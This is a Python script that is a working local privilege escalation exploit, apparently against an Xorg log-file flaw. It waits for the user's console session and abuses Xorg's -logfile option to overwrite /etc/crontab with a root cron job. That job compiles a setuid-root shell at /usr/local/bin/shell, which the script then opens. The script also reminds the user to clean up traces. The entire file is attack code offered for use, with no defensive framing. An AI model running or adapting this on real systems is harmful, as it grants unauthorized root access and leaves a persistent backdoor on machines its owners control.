#!/usr/bin/python
import os
import getpass
import subprocess

userList = []
path="/var/run/console/"

def getWhoami():
	return getpass.getuser()

def getConsole(path):
	p = subprocess.Popen(["ls", path], stdout=subprocess.PIPE)
	(console, err) = p.communicate()
	consoleList = str.splitlines(console)
	return consoleList

def payload():
	f = open("/tmp/payload", "w")
	payload = ("cp /bin/sh /usr/local/bin/shell\n" 
			"echo \"#include <stdio.h> \" > /tmp/shell.c\n"
   			"echo \"#include <stdlib.h>\" >> /tmp/shell.c\n"
   			"echo \"#include <sys/types.h>\" >> /tmp/shell.c\n"
   			"echo \"#include <unistd.h>\" >> /tmp/shell.c\n"
			"echo 'int main(){setuid(0);setgid(0);system(\"/bin/sh\");}' >> /tmp/shell.c\n"
			"gcc /tmp/shell.c -o /usr/local/bin/shell\n"
			"chmod 4777 /usr/local/bin/shell\n")
	f.write(payload)	
	
def executePayload():	
	os.system("chmod +x /tmp/payload")
	os.system("cd /etc; Xorg -fp \"* * * * * root /tmp/payload\" -logfile crontab :1 &")
	print "[*] crontab overwritten"
	os.system("sleep 5")
	os.system("pkill Xorg")
	print "[*] Xorg killed"
	os.system("sleep 120")
	return

def main():
	whoami = getWhoami()
	print "[*] Waiting for " + whoami + " to connect to the console"
	i = 0
	while (i == 0):
		consoleList = getConsole(path)
		for user in consoleList:
			if user == whoami :
				print "[*] OK --> " + user + " console opened"
				i = 1
	print "[*] Building root shell wait 2 minutes"
	payload()
	executePayload()
	print "[*] Don't forget to cleanup /etc/crontab and /tmp dir"
	os.system("/usr/local/bin/shell")			

if __name__ == '__main__':
	main()
